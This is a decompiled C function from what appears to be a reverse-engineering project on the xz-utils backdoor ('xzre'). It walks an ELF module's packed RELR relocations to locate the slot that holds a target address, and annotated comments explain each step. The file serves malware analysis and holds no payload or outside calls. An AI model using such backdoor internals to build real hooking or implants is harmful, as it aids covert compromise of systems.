// /home/kali/xzre-ghidra/xzregh/101C30_elf_relr_find_relative_slot.c
// Function: elf_relr_find_relative_slot @ 0x101C30
// Calling convention: __stdcall
// Prototype: Elf64_Relr * __stdcall elf_relr_find_relative_slot(elf_info_t * elf_info, void * target_addr, u8 * slot_lower_bound, u8 * slot_upper_bound, ulong * resume_index_ptr)


/*
 * AutoDoc: Performs the same search as `elf_rela_find_relative_slot` but against the packed RELR bitmap stream. The helper requires
 * RELR metadata (feature bit 4), rebuilds literal entries vs. bitmap runs into candidate pointers, validates each
 * pointer with `elf_vaddr_range_has_pflags`, and compares the dereferenced value against the requested absolute address.
 * Optional `[slot_lower_bound, slot_upper_bound]` and `resume_index_ptr` parameters let callers clamp the acceptable
 * slot range and resume the walk mid-stream. NULL means the module had no RELR entries, none targeted the requested
 * address, or the decoded pointer failed validation.
 */

#include "xzre_types.h"

Elf64_Relr *
elf_relr_find_relative_slot
          (elf_info_t *elf_info,void *target_addr,u8 *slot_lower_bound,u8 *slot_upper_bound,
          ulong *resume_index_ptr)

{
  uint relr_count;
  Elf64_Ehdr *elfbase;
  BOOL addr_ok;
  ulong relr_index;
  u8 *relr_slot_ptr;
  long relr_stream_offset;
  ulong relr_entry;
  
  elfbase = elf_info->elfbase;
  // AutoDoc: RELR support is optional—bail immediately when the module never published bitmap metadata.
  if ((elf_info->feature_flags & X_ELF_RELR) != 0) {
    relr_count = elf_info->relr_reloc_count;
    if ((target_addr != (void *)0x0) && (relr_count != 0)) {
      relr_index = 0;
      if (resume_index_ptr != (ulong *)0x0) {
        relr_index = *resume_index_ptr;
      }
      relr_stream_offset = 0;
      for (; relr_index < relr_count; relr_index = relr_index + 1) {
        relr_slot_ptr = (u8 *)elfbase + relr_stream_offset;
        relr_entry = elf_info->relr_relocs[relr_index];
        // AutoDoc: Literal entries carry an absolute pointer; validate it and compare the stored addend once.
        if ((relr_entry & ELF64_RELR_IS_BITMAP) == 0) {
          relr_slot_ptr = (u8 *)elfbase + relr_entry;
          addr_ok = elf_vaddr_range_has_pflags(elf_info,relr_slot_ptr,8,4);
          if (addr_ok == FALSE) {
            return (Elf64_Relr *)0x0;
          }
          // AutoDoc: Only return matches that land inside the optional `[slot_lower_bound, slot_upper_bound]` window.
          if ((*(Elf64_Relr *)relr_slot_ptr == (long)target_addr - (long)elfbase) &&
             ((slot_lower_bound == (u8 *)0x0 ||
              ((slot_lower_bound <= relr_slot_ptr && (relr_slot_ptr <= slot_upper_bound)))))) {
LAB_00101d98:
            if (resume_index_ptr != (ulong *)0x0) {
              *resume_index_ptr = relr_index + 1;
              return (Elf64_Relr *)relr_slot_ptr;
            }
            return (Elf64_Relr *)relr_slot_ptr;
          }
          relr_stream_offset = relr_entry + 8;
        }
        else {
          // AutoDoc: Bitmap entries expand into 63 consecutive slots—each set bit hands back another 8-byte pointer.
          while (relr_entry = relr_entry >> ELF64_RELR_BITMAP_SHIFT, relr_entry != 0) {
            if ((relr_entry & ELF64_RELR_IS_BITMAP) != 0) {
              addr_ok = elf_vaddr_range_has_pflags(elf_info,relr_slot_ptr,8,4);
              if (addr_ok == FALSE) {
                return (Elf64_Relr *)0x0;
              }
              if ((*(Elf64_Relr *)relr_slot_ptr == (long)target_addr - (long)elfbase) &&
                 ((slot_lower_bound == (u8 *)0x0 ||
                  ((slot_lower_bound <= relr_slot_ptr && (relr_slot_ptr <= slot_upper_bound)))))) goto LAB_00101d98;
            }
            relr_slot_ptr = relr_slot_ptr + 8;
          }
          relr_stream_offset = relr_stream_offset + ELF64_RELR_BITMAP_STRIDE_BYTES;
        }
      }
      if (resume_index_ptr != (ulong *)0x0) {
        *resume_index_ptr = relr_index;
      }
    }
  }
  return (Elf64_Relr *)0x0;
}

